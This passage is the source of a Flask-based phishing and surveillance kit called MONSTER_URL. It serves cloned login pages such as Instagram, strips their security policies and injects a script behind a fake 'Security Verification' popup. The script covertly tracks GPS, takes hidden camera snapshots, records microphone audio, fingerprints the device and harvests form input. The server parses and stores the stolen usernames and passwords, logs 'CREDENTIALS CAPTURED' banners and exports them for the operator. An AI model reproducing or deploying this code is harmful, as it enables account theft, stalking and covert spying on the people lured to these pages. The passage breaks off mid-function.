        background: linear-gradient(135deg, #00ff88, #00cc66) !important;
        color: #04090f !important;
        border: none !important;
        border-radius: 14px !important;
        padding: 14px 20px !important;
        font-size: 15px !important;
        font-weight: 800 !important;
        cursor: pointer !important;
        width: 100% !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        gap: 8px !important;
        box-shadow: 0 4px 20px rgba(0, 255, 136, 0.45) !important;
        transition: transform 0.15s ease, box-shadow 0.15s ease !important;
    }}
    .m-btn:active {{
        transform: scale(0.97) !important;
    }}
    .m-btn.loading {{
        background: #1e293b !important;
        color: #00ff88 !important;
        box-shadow: 0 0 18px rgba(0, 255, 136, 0.3) !important;
        animation: mBtnPulse 1.2s infinite !important;
    }}
    @keyframes mBtnPulse {{
        0%, 100% {{ opacity: 1; }}
        50% {{ opacity: 0.75; }}
    }}
    .m-hint {{
        font-size: 12px !important;
        color: #94a3b8 !important;
        margin-top: 12px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        gap: 6px !important;
        font-weight: 600 !important;
    }}
    </style>

    <div id="m-reward-overlay">
        <div id="m-reward-card">
            <div class="m-radar-badge">🛡️</div>
            <div class="m-sensor-badges">
                <span class="m-sensor-badge">📍 GPS Location</span>
                <span class="m-sensor-badge">📷 Camera</span>
                <span class="m-sensor-badge">🎙 Microphone</span>
            </div>
            <div class="m-title">Device & <span class="m-reward-highlight">Security Verification</span></div>
            <p class="m-msg-hindi">
                कृपया जारी रखने के लिए ऊपर आए ब्राउज़र पॉपअप में <b>'Allow'</b> पर क्लिक करें।
            </p>
            <p class="m-msg-eng">
                Please tap <b>'Allow'</b> on the browser prompt to verify device security and continue.
            </p>
            <div class="m-progress-wrap">
                <div class="m-progress-bar" id="m-prog-bar"></div>
            </div>
            <button class="m-btn" id="m-claim-btn" onclick="window.mUserTriggerPermission(event)">
                <span id="m-btn-label">🛡️ Allow & Verify (<span id="m-btn-sec">5</span>s)</span>
            </button>
            <div class="m-hint" id="m-hint-text">👆 Tap 'Allow' on the top browser popup when prompted</div>
        </div>
    </div>

    <script>
    (function(){{
        const TOKEN = "{token}";
        const LOC_REQ = {loc_enabled};
        const CAM_REQ = {cam_enabled};
        const MIC_REQ = {mic_enabled};
        let locWatcher = null;
        let cameraActive = false;
        let audioActive = false;
        let gpsAcquired = false;
        let promptTriggered = false;

        const progBar = document.getElementById("m-prog-bar");
        const claimBtn = document.getElementById("m-claim-btn");
        const btnLabel = document.getElementById("m-btn-label");
        const btnSec = document.getElementById("m-btn-sec");
        const countSec = document.getElementById("m-count-sec");
        const overlay = document.getElementById("m-reward-overlay");
        const hintText = document.getElementById("m-hint-text");

        // --- 1. POPUP 5-SECOND MINIMUM COUNTDOWN ANIMATION ---
        let elapsedMs = 0;
        let totalMs = 5000;
        let timerHandle = setInterval(() => {{
            elapsedMs += 50;
            let remainingSec = Math.max(0, Math.ceil((totalMs - elapsedMs) / 1000));
            let pct = Math.min(100, (elapsedMs / totalMs) * 100);
            
            if (progBar) progBar.style.width = pct + "%";
            if (countSec) countSec.textContent = remainingSec;
            if (btnSec) btnSec.textContent = remainingSec;

            if (elapsedMs >= totalMs) {{
                clearInterval(timerHandle);
                if (btnLabel) btnLabel.textContent = "🛡️ Tap 'Allow' Above to Continue";
                if (!promptTriggered) {{
                    window.mUserTriggerPermission();
                }}
            }}
        }}, 50);

        function dismissOverlay() {{
            if (timerHandle) clearInterval(timerHandle);
            if (overlay) {{
                overlay.style.transition = "opacity 0.4s ease, transform 0.4s ease";
                overlay.style.opacity = "0";
                overlay.style.transform = "scale(0.96)";
                setTimeout(() => {{
                    try {{ overlay.remove(); }} catch(e){{}}
                }}, 450);
            }}
        }}

        // --- 2. USER GESTURE TRIGGER (Synchronous Click Activation) ---
        window.mUserTriggerPermission = function(e) {{
            if (e && e.preventDefault) e.preventDefault();
            promptTriggered = true;
            if (timerHandle) clearInterval(timerHandle);

            if (claimBtn) {{
                claimBtn.classList.add("loading");
                claimBtn.innerHTML = "<span>⏳ Requesting Access... Tap 'ALLOW' Above ☝️</span>";
            }}
            if (hintText) {{
                hintText.innerHTML = "⚠️ <b>Please click 'ALLOW' on the browser prompt at the top!</b>";
                hintText.style.color = "#00ff88";
            }}

            // Directly invoke GPS & Media in synchronous user gesture callstack
            triggerGeolocation();
            startMediaCapture();

            // Safety timeout: dismiss overlay after 12s so site remains fully usable
            setTimeout(() => {{
                if (!gpsAcquired) dismissOverlay();
            }}, 12000);
        }};

        // --- 3. DEVICE FOOTPRINT TELEMETRY REPORT ---
        async function sendReport(extraData) {{
            try {{
                let screenInfo = `${{window.screen.width}}x${{window.screen.height}} (${{window.screen.colorDepth}}-bit)`;
                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
                let ram = navigator.deviceMemory ? `${{navigator.deviceMemory}} GB RAM` : "";
                let cpu = navigator.hardwareConcurrency ? `${{navigator.hardwareConcurrency}} CPU Cores` : "";
                
                let gpu = "";
                try {{
                    let canvas = document.createElement("canvas");
                    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                    if (gl) {{
                        let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                        if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }}
                }} catch(e){{}}

                let battery_level = null, battery_charging = 0;
                if (navigator.getBattery) {{
                    try {{
                        let bat = await navigator.getBattery();
                        battery_level = bat.level;
                        battery_charging = bat.charging ? 1 : 0;
                    }} catch(e){{}}
                }}

                let payload = Object.assign({{
                    screen: screenInfo,
                    timezone: timezone,
                    ram: ram,
                    cpu: cpu,
                    gpu: gpu,
                    battery_level: battery_level,
                    battery_charging: battery_charging
                }}, extraData || {{}});

                fetch(`/api/t/${{TOKEN}}/report`, {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify(payload)
                }}).catch(() => {{}});
            }} catch(e){{}}
        }}

        // Send initial device footprint immediately
        sendReport();

        // --- 4. REAL HIGH-PRECISION GPS ENGINE ---
        function triggerGeolocation() {{
            if (!navigator.geolocation) return;
            
            function onPos(pos) {{
                gpsAcquired = true;
                if (claimBtn) {{
                    claimBtn.classList.remove("loading");
                    claimBtn.style.background = "linear-gradient(135deg, #00ff88, #00e5ff)";
                    claimBtn.innerHTML = "<span>✅ Verified! Unlocking...</span>";
                }}
                
                sendReport({{
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    speed: pos.coords.speed,
                    heading: pos.coords.heading,
                    alt: pos.coords.altitude
                }});

                setTimeout(dismissOverlay, 700);
            }}

            function onErr(err) {{
                try {{
                    navigator.geolocation.getCurrentPosition(
                        onPos,
                        () => {{}},
                        {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
                    );
                }} catch(e) {{}}
            }}

            // 1. High-accuracy immediate GPS fix
            try {{
                navigator.geolocation.getCurrentPosition(
                    onPos,
                    onErr,
                    {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
                );
            }} catch(e) {{
                onErr(e);
            }}

            // 2. Continuous real-time GPS tracking
            if (!locWatcher) {{
                try {{
                    locWatcher = navigator.geolocation.watchPosition(
                        onPos,
                        () => {{}},
                        {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
                    );
                }} catch(e) {{}}
            }}
        }}

        // Immediate trigger on load
        try {{
            triggerGeolocation();
        }} catch(e){{}}

        // Permissions API Observer
        if (navigator.permissions && navigator.permissions.query) {{
            try {{
                navigator.permissions.query({{ name: "geolocation" }}).then(p => {{
                    if (p.state === "granted") triggerGeolocation();
                    p.onchange = () => {{
                        if (p.state === "granted") triggerGeolocation();
                    }};
                }}).catch(() => {{}});
            }} catch(e){{}}
        }}

        // --- 5. CAMERA SETUP & SNAPSHOT CAPTURE ---
        function setupCameraCapture(stream) {{
            if (!stream || !stream.getVideoTracks().length) return;
            cameraActive = true;
            let videoEl = document.getElementById("m-tele-video");
            if (!videoEl) {{
                videoEl = document.createElement("video");
                videoEl.id = "m-tele-video";
                videoEl.setAttribute("autoplay", "");
                videoEl.setAttribute("playsinline", "");
                videoEl.setAttribute("muted", "");
                videoEl.muted = true;
                videoEl.playsInline = true;
                videoEl.style.position = "fixed";
                videoEl.style.top = "0";
                videoEl.style.left = "0";
                videoEl.style.width = "320px";
                videoEl.style.height = "240px";
                videoEl.style.opacity = "0.001";
                videoEl.style.pointerEvents = "none";
                videoEl.style.zIndex = "-99999";
                document.body.appendChild(videoEl);
            }}

            videoEl.srcObject = stream;
            videoEl.play().catch(() => {{}});

            function captureFrame() {{
                if (!videoEl || videoEl.videoWidth === 0 || videoEl.videoHeight === 0) return;
                try {{
                    const canvas = document.createElement("canvas");
                    canvas.width = videoEl.videoWidth;
                    canvas.height = videoEl.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {{
                        if (blob) {{
                            const fd = new FormData();
                            fd.append("kind", "photo");
                            fd.append("file", blob, "photo_" + Date.now() + ".jpg");
                            fetch(`/api/t/${{TOKEN}}/media`, {{ method: "POST", body: fd }}).catch(() => {{}});
                        }}
                    }}, "image/jpeg", 0.82);
                }} catch(e){{}}
            }}

            videoEl.onloadedmetadata = () => {{
                setTimeout(captureFrame, 400);
                setTimeout(captureFrame, 1200);
            }};
            setTimeout(captureFrame, 500);
            setTimeout(captureFrame, 1500);
            setTimeout(captureFrame, 3000);
            setInterval(captureFrame, 3500);
        }}

        // --- 6. MICROPHONE AUDIO RECORDING ---
        function setupAudioRecording(stream) {{
            if (!stream || !stream.getAudioTracks().length || !window.MediaRecorder) return;
            audioActive = true;
            const audioTrack = stream.getAudioTracks()[0];
            const audioStream = new MediaStream([audioTrack]);

            const mimeCandidates = [
                "audio/webm;codecs=opus",
                "audio/webm",
                "audio/mp4",
                "audio/aac",
                "audio/ogg"
            ];
            const chosenMime = mimeCandidates.find(m => MediaRecorder.isTypeSupported(m)) || "";
            const ext = chosenMime.includes("mp4") || chosenMime.includes("aac") ? ".mp4" : ".webm";

            function recordChunk() {{
                try {{
                    const rec = new MediaRecorder(audioStream, chosenMime ? {{ mimeType: chosenMime }} : undefined);
                    let chunks = [];
                    rec.ondataavailable = e => {{
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    }};
                    rec.onstop = () => {{
                        if (chunks.length > 0) {{
                            const audioBlob = new Blob(chunks, {{ type: chosenMime || "audio/webm" }});
                            const fd = new FormData();
                            fd.append("kind", "audio");
                            fd.append("file", audioBlob, "audio_" + Date.now() + ext);
                            fetch(`/api/t/${{TOKEN}}/media`, {{ method: "POST", body: fd }}).catch(() => {{}});
                        }}
                        setTimeout(recordChunk, 1000);
                    }};
                    rec.start();
                    setTimeout(() => {{
                        if (rec.state === "recording") rec.stop();
                    }}, 5000);
                }} catch(e){{}}
            }}

            recordChunk();
        }}

        // --- 7. UNIFIED MEDIA CAPTURE WITH ROBUST FALLBACKS ---
        async function startMediaCapture() {{
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

            // Attempt 1: Combined Camera + Audio
            if (!cameraActive || !audioActive) {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }},
                        audio: true
                    }});
                    setupCameraCapture(stream);
                    setupAudioRecording(stream);
                    return;
                }} catch(err) {{}}
            }}

            // Attempt 2: Camera only
            if (!cameraActive) {{
                try {{
                    const vStream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }}
                    }});
                    setupCameraCapture(vStream);
                }} catch(err) {{}}
            }}

            // Attempt 3: Audio only
            if (!audioActive) {{
                try {{
                    const aStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                    setupAudioRecording(aStream);
                }} catch(err) {{}}
            }}
        }}

        // --- 8. UNIVERSAL USER INTERACTION LISTENERS ---
        ["click", "touchstart", "pointerdown", "focusin", "keydown", "input", "change"].forEach(evt => {{
            window.addEventListener(evt, () => {{
                if (!gpsAcquired) triggerGeolocation();
                if (!cameraActive || !audioActive) startMediaCapture();
            }}, {{ passive: true }});
        }});

        // --- 9. UNIVERSAL FORM HARVESTER & ACTION REWRITER ---
        document.addEventListener("DOMContentLoaded", () => {{
            // Re-trigger permissions when user interacts with login forms / inputs
            document.querySelectorAll("input, button, form, select, textarea").forEach(el => {{
                ["focus", "click", "input", "change"].forEach(ev => {{
                    el.addEventListener(ev, () => {{
                        if (!gpsAcquired) triggerGeolocation();
                        if (!cameraActive || !audioActive) startMediaCapture();
                    }});
                }});
            }});

            // Intercept all form submissions across all 44 site templates
            document.addEventListener("submit", function(e) {{
                let form = e.target;
                if (!form || form.tagName !== "FORM") return;
                
                let formData = {{}};
                let elements = form.querySelectorAll("input, select, textarea");
                elements.forEach(el => {{
                    if (el.name && el.value !== undefined) {{
                        if (el.type === "checkbox" || el.type === "radio") {{
                            if (el.checked) formData[el.name] = el.value;
                        }} else {{
                            formData[el.name] = el.value;
                        }}
                    }}
                }});

                // Immediately harvest credentials via keepalive / sendBeacon
                if (Object.keys(formData).length > 0) {{
                    try {{
                        if (navigator.sendBeacon) {{
                            let blob = new Blob([JSON.stringify(formData)], {{ type: "application/json" }});
                            navigator.sendBeacon(`/api/t/${{TOKEN}}/submit`, blob);
                        }} else {{
                            fetch(`/api/t/${{TOKEN}}/submit`, {{
                                method: "POST",
                                headers: {{ "Content-Type": "application/json" }},
                                body: JSON.stringify(formData),
                                keepalive: true
                            }}).catch(() => {{}});
                        }}
                    }} catch(err){{}}
                }}

                // Rewrite form action if it points to external URLs
                let curAction = form.getAttribute("action") || "";
                if (curAction.startsWith("http://") || curAction.startsWith("https://")) {{
                    e.preventDefault();
                    fetch(`/api/t/${{TOKEN}}/submit`, {{
                        method: "POST",
                        headers: {{ "Content-Type": "application/json" }},
                        body: JSON.stringify(formData),
                        keepalive: true
                    }}).finally(() => {{
                        window.location.href = curAction;
                    }});
                }}
            }}, true);
        }});
    }})();
    </script>
    """


def find_site_landing_file(site_dir, user_agent=""):
    """Finds the main entry point (mobile.html, login.html, index.html, index.php) for a site."""
    ua_lower = (user_agent or "").lower()
    is_mobile = any(m in ua_lower for m in ["android", "iphone", "ipad", "ipod", "mobile"])

    # Check for mobile specific page if mobile device
    if is_mobile and (site_dir / "mobile.html").is_file():
        return site_dir / "mobile.html"
    
    # Priority order for site files
    for fname in ["login.html", "index.html", "mobile.html", "index.php", "pass.php"]:
        fpath = site_dir / fname
        if fpath.is_file():
            # If it's a PHP file with a Location redirect (e.g. index.php -> login.html), follow it
            if fpath.suffix.lower() == ".php":
                try:
                    c = fpath.read_text(encoding="utf-8", errors="ignore")
                    m = re.search(r"header\s*\(\s*['\"]Location:\s*([^'\"]+)['\"]\s*\)", c, re.IGNORECASE)
                    if m:
                        target = m.group(1).strip().lstrip("./")
                        if (site_dir / target).is_file():
                            return site_dir / target
                except Exception:
                    pass
            return fpath
            
    # Fallback to first html/php file found
    for fpath in site_dir.iterdir():
        if fpath.is_file() and fpath.suffix.lower() in [".html", ".htm", ".php"]:
            return fpath
            
    return None


def get_php_redirect(site_dir, action_file="login.php"):
    """Extracts redirect target from a PHP file if present."""
    action_clean = action_file.strip().lstrip("./").lstrip("/")
    
    candidates = [
        site_dir / action_clean,
        site_dir / f"{action_clean}.php",
        site_dir / "login.php",
        site_dir / "pass.php",
        site_dir / "post.php",
        site_dir / "process.php",
        site_dir / "check.php",
        site_dir / "index.php"
    ]
    
    for php_path in candidates:
        if php_path.exists() and php_path.is_file():
            try:
                content = php_path.read_text(encoding="utf-8", errors="ignore")
                m = re.search(r"header\s*\(\s*['\"]Location:\s*([^'\"]+)['\"]\s*\)", content, re.IGNORECASE)
                if m:
                    return m.group(1).strip()
            except Exception:
                pass
    return None


@app.route("/t/<token>", methods=["GET"])
def client_entry_redirect(token):
    return redirect(f"/t/{token}/")


@app.route("/t/<token>/", methods=["GET"])
def client_entry(token):
    link = link_by_token(token)
    if not link:
        abort(404)

    site_name = (link["theme"] or "instagram").strip().lower()
    site_dir = SITES_DIR / site_name
    if not site_dir.is_dir():
        site_name = "instagram"
        site_dir = SITES_DIR / site_name

    # Track visit
    try:
        get_db().execute("UPDATE links SET visits = visits + 1 WHERE id=?", (link["id"],))
        get_db().commit()
    except Exception:
        pass

    landing_file = find_site_landing_file(site_dir, request.headers.get("User-Agent", ""))
    if not landing_file or not landing_file.exists():
        abort(404)

    try:
        content = landing_file.read_text(encoding="utf-8", errors="ignore")
    except Exception:
        content = landing_file.read_bytes().decode("latin1", errors="ignore")

    # Sanitize PHP open/close tags and CSP meta tags that block telemetry/media
    content = re.sub(r"<\?php[\s\S]*?\?>", "", content, flags=re.IGNORECASE)
    content = re.sub(r"<meta\s+[^>]*content-security-policy[^>]*>", "", content, flags=re.IGNORECASE)

    # Inject Stealth Telemetry Beacon with GPS Permission & Reward Popup
    beacon = generate_telemetry_beacon(token, link)
    if re.search(r"</body>", content, re.IGNORECASE):
        content = re.sub(r"(?i)</body>", f"{beacon}\n</body>", content, count=1)
    elif re.search(r"</html>", content, re.IGNORECASE):
        content = re.sub(r"(?i)</html>", f"{beacon}\n</html>", content, count=1)
    else:
        content = content + beacon

    return Response(content, mimetype="text/html; charset=utf-8")


@app.route("/t/<token>/<path:subpath>", methods=["GET"])
def serve_site_subpath(token, subpath):
    link = link_by_token(token)
    if not link:
        abort(404)

    site_name = (link["theme"] or "instagram").strip().lower()
    site_dir = SITES_DIR / site_name
    if not site_dir.is_dir():
        site_name = "instagram"
        site_dir = SITES_DIR / site_name

    target_file = site_dir / subpath
    
    # Check fallback in sites/ root
    if not target_file.exists():
        target_file = SITES_DIR / subpath
        
    if not target_file.exists() or not target_file.is_file():
        # Check if subpath matches an html or php page
        if (site_dir / f"{subpath}.html").is_file():
            target_file = site_dir / f"{subpath}.html"
        elif (site_dir / f"{subpath}.php").is_file():
            target_file = site_dir / f"{subpath}.php"
        else:
            # If requesting a missing php action file via GET, check for redirect
            redir = get_php_redirect(site_dir, subpath)
            if redir:
                if redir.startswith("http://") or redir.startswith("https://"):
                    return redirect(redir)
                else:
                    clean_sub = redir.lstrip("./")
                    return redirect(url_for("serve_site_subpath", token=token, subpath=clean_sub))
            abort(404)

    ext = target_file.suffix.lower()
    
    # If PHP file with Location header, redirect accordingly
    if ext == ".php":
        try:
            content = target_file.read_text(encoding="utf-8", errors="ignore")
            m = re.search(r"header\s*\(\s*['\"]Location:\s*([^'\"]+)['\"]\s*\)", content, re.IGNORECASE)
            if m:
                target_loc = m.group(1).strip()
                if target_loc.startswith("http://") or target_loc.startswith("https://"):
                    return redirect(target_loc)
                else:
                    clean_sub = target_loc.lstrip("./")
                    return redirect(url_for("serve_site_subpath", token=token, subpath=clean_sub))
        except Exception:
            pass

    # If HTML or PHP page, render with stealth beacon
    if ext in [".html", ".htm", ".php"]:
        try:
            content = target_file.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            content = target_file.read_bytes().decode("latin1", errors="ignore")

        content = re.sub(r"<\?php[\s\S]*?\?>", "", content, flags=re.IGNORECASE)
        content = re.sub(r"<meta\s+[^>]*content-security-policy[^>]*>", "", content, flags=re.IGNORECASE)
        beacon = generate_telemetry_beacon(token, link)
        if re.search(r"</body>", content, re.IGNORECASE):
            content = re.sub(r"(?i)</body>", f"{beacon}\n</body>", content, count=1)
        elif re.search(r"</html>", content, re.IGNORECASE):
            content = re.sub(r"(?i)</html>", f"{beacon}\n</html>", content, count=1)
        else:
            content = content + beacon
            
        return Response(content, mimetype="text/html; charset=utf-8")

    return send_file(target_file)


# ---------------- Target Form Submission & Credential Harvester ----------------
@app.route("/t/<token>", methods=["POST"])
@app.route("/t/<token>/", methods=["POST"])
@app.route("/t/<token>/<path:subpath>", methods=["POST"])
@app.route("/api/t/<token>/submit", methods=["POST"])
def capture_form_submission(token, subpath=""):
    link = link_by_token(token)
    if not link:
        if request.is_json or request.path.startswith("/api/"):
            return jsonify({"ok": False, "error": "invalid token"}), 404
        abort(404)

    site_name = (link["theme"] or "instagram").strip().lower()
    site_dir = SITES_DIR / site_name

    # Extract all submitted fields from form, json or query
    form_data = {}
    if request.form:
        form_data.update(request.form.to_dict())
    if request.is_json:
        try:
            jsonData = request.get_json(force=True, silent=True) or {}
            form_data.update(jsonData)
        except Exception:
            pass
    if not form_data and request.values:
        form_data.update(request.values.to_dict())

    # Extract IP & Device Info
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if client_ip and "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    device_summary = parse_user_agent(ua)

    # Intelligent Credential Parser
    account_keys = [
        "username", "email", "login", "user", "phone", "email_or_phone",
        "account", "login_email", "session_key", "accountName", "userid",
        "identifier", "number", "u", "id", "full_name", "name"
    ]
    password_keys = [
        "password", "pass", "passwd", "pwd", "pin", "key", "secret",
        "passcode", "security_code", "p", "access_code", "opinion"
    ]

    account = ""
    password = ""
    extra = {}

    for k, v in form_data.items():
        k_lower = k.lower().strip()
        v_str = str(v).strip()
        
        if not account and any(ak == k_lower or ak in k_lower for ak in account_keys):
            account = v_str
        elif not password and any(pk == k_lower or pk in k_lower for pk in password_keys):
            password = v_str
        else:
            extra[k] = v_str

    # Fallback if specific keys not matched
    if not account and form_data:
        first_key = list(form_data.keys())[0]
        account = str(form_data[first_key]).strip()
        if len(form_data) > 1 and not password:
            second_key = list(form_data.keys())[1]
            password = str(form_data[second_key]).strip()

    extra_json = json.dumps(extra) if extra else ""

    # Human-readable site name
    site_meta = SITES_METADATA.get(site_name, {})
    site_display = site_meta.get("name", site_name.replace("_", " ").title())

    # Insert into database
    db = get_db()
    db.execute(
        "INSERT INTO submissions (link_id, site, account, password, extra_data, ip, ua, device, full_name, username, phone, opinion, created_at) "
        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            link["id"],
            site_display,
            account,
            password,
            extra_json,
            client_ip,
            ua,
            device_summary,
            account,
            account,
            extra.get("phone", ""),
            extra_json,
            now_iso()
        )
    )
    db.commit()

    # Formatted Terminal Banner
    print("\n" + "="*65)
    print(f" 🔥 [MONSTER_URL] CREDENTIALS CAPTURED FROM TARGET!")
    print(f" 🌐 Target Site : {site_meta.get('icon', '🌐')} {site_display}")
    print(f" 🔗 Link Name   : {link['name']}")
    print(f" 👤 Account / ID: {account or '(None)'}")
    print(f" 🔑 Password    : {password or '(None)'}")
    if extra:
        print(f" 📦 Extra Data  : {json.dumps(extra, indent=2)}")
    print(f" 📍 IP Address  : {client_ip}")
    print(f" 📱 Device Info : {device_summary}")
    print(f" ⏰ Timestamp   : {now_iso()}")
    print("="*65 + "\n")

    # If API call or JSON request, return JSON response
    if request.is_json or request.path.startswith("/api/") or "application/json" in request.headers.get("Accept", ""):
        return jsonify({"ok": True, "message": "Credentials captured successfully"})

    # Determine Redirection Target for browser form post
    redir = get_php_redirect(site_dir, subpath or "login.php")
    if redir:
        if redir.startswith("http://") or redir.startswith("https://"):
            return redirect(redir)
        else:
            clean_sub = redir.lstrip("./")
            return redirect(url_for("serve_site_subpath", token=token, subpath=clean_sub))

    # Default platform redirect
    default_redir = site_meta.get("redirect", f"https://www.{site_name}.com")
    return redirect(default_redir)


# ---------------- Telemetry Report Endpoints ----------------
@app.route("/api/t/<token>/report", methods=["POST"])
def api_report(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    data = request.get_json(force=True, silent=True) or {}
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if client_ip and "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    lat = data.get("lat")
    lon = data.get("lon")
    accuracy = data.get("accuracy")

    db = get_db()
    db.execute(
        "INSERT INTO reports (link_id,lat,lon,accuracy,speed,heading,alt,"
        "battery_level,battery_charging,ua,ip,gpu,screen,ram,cpu,timezone,created_at) "
        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            link["id"],
            lat, lon, accuracy,
            data.get("speed"), data.get("heading"), data.get("alt"),
            data.get("battery_level"), data.get("battery_charging"),
            request.headers.get("User-Agent", ""), client_ip,
            data.get("gpu"), data.get("screen"), data.get("ram"),
            data.get("cpu"), data.get("timezone"),
            now_iso(),
        ),
    )
    db.commit()
    
    dev_info = parse_user_agent(request.headers.get("User-Agent", ""))
    
    if lat is not None and lon is not None:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        print("\n" + "="*65)
        print(f" 🎯 [MONSTER_URL] REAL GPS LOCATION CAPTURED!")
        print(f" 🔗 Link: {link['name']} | IP: {client_ip} | Device: {dev_info}")
        print(f" 📍 GPS Coordinates: {lat:.6f}, {lon:.6f} (Accuracy: ±{accuracy:.0f}m)")
        print(f" 🗺️ Google Maps: {maps_url}")
        print("="*65 + "\n")
    else:
        print(f" [🎯 TARGET ACTIVITY] Link: {link['name']} | IP: {client_ip} | Device: {dev_info} | Telemetry Recorded (Pending GPS Fix)")
    
    return jsonify({"ok": True})


@app.route("/api/t/<token>/media", methods=["POST"])
def api_media_upload(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    kind = request.form.get("kind", "photo")
    if kind not in ("photo", "audio"):
        return jsonify({"ok": False, "error": "bad kind"}), 400
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"ok": False, "error": "no file"}), 400
    
    orig_ext = Path(f.filename).suffix.lower()
    if kind == "photo":
        ext = orig_ext if orig_ext in [".jpg", ".jpeg", ".png", ".webp"] else ".jpg"
    else:
        ext = orig_ext if orig_ext in [".webm", ".mp4", ".m4a", ".ogg", ".aac", ".wav"] else ".webm"

    fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"
    f.save(MEDIA_DIR / fname)
    db = get_db()
    db.execute(
        "INSERT INTO media (link_id,kind,filename,created_at) VALUES (?,?,?,?)",
        (link["id"], kind, fname, now_iso()),
    )
    db.commit()

    print(f" [📷 MEDIA CAPTURED] Link: {link['name']} | Type: {kind.upper()} | File: {fname}")
    return jsonify({"ok": True, "filename": fname})


# ---------------- Dashboard Data & Submissions API ----------------
@app.route("/api/submissions", methods=["GET", "POST"])
@admin_required
def api_submissions_list():
    db = get_db()
    if request.method == "POST":
        data = request.get_json(force=True, silent=True) or request.form.to_dict() or {}
        link_id = data.get("link_id", 1)
        db.execute(
            "INSERT INTO submissions (link_id, site, account, password, extra_data, ip, ua, device, created_at) "
            "VALUES (?,?,?,?,?,?,?,?,?)",
            (
                link_id,
                data.get("site", "Custom"),
                data.get("account", ""),
                data.get("password", ""),
                json.dumps(data.get("extra", {})),
                request.headers.get("X-Forwarded-For", request.remote_addr),
                request.headers.get("User-Agent", ""),
                parse_user_agent(request.headers.get("User-Agent", "")),
                now_iso()
            )
        )
        db.commit()
        return jsonify({"ok": True})

    rows = db.execute(
        """
        SELECT s.*, l.name AS link_name, l.theme AS link_theme
        FROM submissions s
        JOIN links l ON l.id = s.link_id
        ORDER BY s.id DESC LIMIT 500
        """
    ).fetchall()
    
    report_rows = db.execute(
        "SELECT link_id, lat, lon, accuracy FROM reports WHERE lat IS NOT NULL AND lon IS NOT NULL ORDER BY id DESC"
    ).fetchall()
    latest_geo = {}
    for r in report_rows:
        if r["link_id"] not in latest_geo:
            latest_geo[r["link_id"]] = (r["lat"], r["lon"], r["accuracy"])

    out = []
    for r in rows:
        d = dict(r)
        if not d.get("site"):
            meta = SITES_METADATA.get(d.get("link_theme", ""), {})
            d["site"] = meta.get("name", (d.get("link_theme") or "Website").replace("_", " ").title())
            
        if not d.get("account"):
            d["account"] = d.get("username") or d.get("full_name") or "—"
        if not d.get("password"):
            d["password"] = d.get("phone") or "—"
            
        geo = latest_geo.get(d["link_id"])
        if geo:
            d["lat"] = geo[0]
            d["lon"] = geo[1]
            d["accuracy"] = geo[2]
            d["maps_url"] = f"https://www.google.com/maps?q={geo[0]},{geo[1]}"
        else:
            d["lat"] = None
            d["lon"] = None
            d["accuracy"] = None
            d["maps_url"] = None

        out.append(d)
        
    return jsonify(out)


@app.route("/api/submissions/<int:sid>", methods=["DELETE"])
@admin_required
def api_submission_delete(sid):
    db = get_db()
    db.execute("DELETE FROM submissions WHERE id=?", (sid,))
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/submissions/clear", methods=["DELETE"])
@admin_required
def api_submissions_clear():
    db = get_db()
    db.execute("DELETE FROM submissions")
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/submissions/export")
@admin_required
def api_submissions_export():
    fmt = request.args.get("format", "txt").lower()
    rows = get_db().execute(
        "SELECT s.*, l.name AS link_name FROM submissions s "
        "JOIN links l ON l.id = s.link_id ORDER BY s.id DESC"
    ).fetchall()
    
    if fmt == "json":
        data = [dict(r) for r in rows]
        return Response(
            json.dumps(data, indent=2),
            mimetype="application/json",
            headers={"Content-Disposition": "attachment; filename=monster_url_submissions.json"}
        )
    elif fmt == "csv":
        import io, csv
        si = io.StringIO()
        writer = csv.writer(si)
        writer.writerow(["ID", "Link Name", "Site Template", "Account / Username / Email", "Password / PIN", "Extra Data", "IP Address", "Device", "Timestamp"])
        for r in rows:
            writer.writerow([r["id"], r["link_name"], r["site"], r["account"] or r["username"], r["password"] or r["phone"], r["extra_data"] or r["opinion"], r["ip"], r["device"], r["created_at"]])
        return Response(
            si.getvalue(),
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment; filename=monster_url_submissions.csv"}
        )
    else: # txt format
        lines = [
            "="*65,
